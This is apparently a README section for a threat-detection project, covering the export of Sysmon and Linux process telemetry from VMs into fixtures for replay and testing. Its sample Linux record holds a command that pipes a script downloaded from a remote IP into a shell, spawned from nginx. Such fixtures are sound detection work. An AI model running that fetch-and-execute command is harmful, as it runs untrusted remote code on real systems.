# VM telemetry

Process telemetry comes from the VMs as JSON, is wrapped into a fixture with
`scripts/import_vm_json.py`, and is replayed through the normal pipeline. For a 48-hour build this beats
running an agent or a Log Analytics pipeline, and the normalizers don't care where the JSON came from.

## Windows VM (Sysmon)

Install Sysmon with a config that logs Event ID 1 (process create) and 11 (file create) and includes
SHA256 in `HashAlgorithms`. After staging the activity, export on the VM:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1,11; StartTime=(Get-Date).AddHours(-2)} |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $d = [ordered]@{ EventID = $_.Id; Computer = $_.MachineName; EventRecordID = $_.RecordId }
    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]$d
  } | ConvertTo-Json -Depth 3 | Out-File -Encoding utf8 sysmon.json
```

```bash
python scripts/import_vm_json.py --kind windows --file sysmon.json \
  --resource-id /subscriptions/<sub>/resourceGroups/rg-ctdip-demo/providers/Microsoft.Compute/virtualMachines/win-fin-01 \
  --out fixtures/z_capture_win.json
```

Safe staging: open a macro document that launches `powershell -enc` with a harmless encoded command
(for example `Write-Output hello`), and copy a benign executable into `C:\Users\Public\`. Put that
executable's SHA256 into `config/ioc_hashes.txt` to exercise the IOC rule.

## Linux VM (simple JSON)

One JSON object per process execution. Any source (auditd, osquery, eBPF, a wrapper script) can be
mapped to this in a few lines:

```json
{"event_id": 5534, "host": "lin-web-01", "time": "2026-09-18T03:40:51Z",
 "pid": 23011, "ppid": 812, "exe": "/usr/bin/dash", "parent_exe": "/usr/sbin/nginx",
 "cmdline": "sh -c curl -s http://198.51.100.7/x.sh | sh", "user": "www-data", "sha256": ""}
```

`event_id` must be unique per host. `sha256` may be empty. Import with `--kind linux`.

## Fixture format (any source)

```json
{"dataset": "name", "description": "...", "origin": "sample|captured",
 "telemetry_available": ["windows_vm"],
 "directory": {"tenant_id": "...", "tenant_domains": [], "users": [], "apps": []},
 "records": [{"source": "windows_vm", "azure_resource_id": "/subscriptions/...", "raw": {}}]}
```

`telemetry_available` tells the scorer which sources this environment had, so missing telemetry
lowers confidence with a stated reason instead of being ignored.
